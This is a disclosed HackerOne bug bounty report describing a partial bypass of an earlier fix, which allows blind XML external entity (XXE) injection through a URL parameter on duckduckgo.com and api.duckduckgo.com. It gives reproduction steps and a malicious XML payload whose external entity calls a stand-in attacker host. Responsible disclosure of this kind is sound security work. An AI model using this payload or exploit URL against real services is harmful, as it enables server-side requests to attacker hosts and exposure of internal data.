# Partial bypass of #483774 with Blind XXE on https://duckduckgo.com

## Report Details
- **Report ID**: 486732
- **URL**: https://hackerone.com/reports/486732
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-01-26T19:30:34.188Z
- **Disclosed**: 2019-02-25T16:42:25.787Z

## Reporter
- **Username**: mik317
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: duckduckgo

## Vulnerability Information
**Summary:**
Hi DuckDuckGo team,
I've contacted previously you because in a second time (on the #483774 report), I've seen that was possible bypass the fix. Anyway, I've not got any response, and because I think that this is a bit dangerous issue, I'm opening another report for the bypass. Hope you'll agree.

**Steps for reproduction:**
1. Attacker creates a public server and hosts a file with the following content:

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker_host/Blind_xxe"> %ext;
]>
<r></r>
```
2. User goes on https://duckduckgo.com/x.js?u=http://attacker_host/xxe.xml
3. The `http://attacker_host/Blind_xxe` resource will be requested by an host {F413045}

I'd like to say that this affects not only `duckduckgo.com`, but also `api.duckduckgo.com`. Anyway, the #483908 report is still in the `triaged` state, so I think that will not be right against you submit another report also for the `api.duckduckgo.com` domain.

## Impact

Blind XXE leads to `dos` and `blind injection`.

## Attachments
- xxe.png
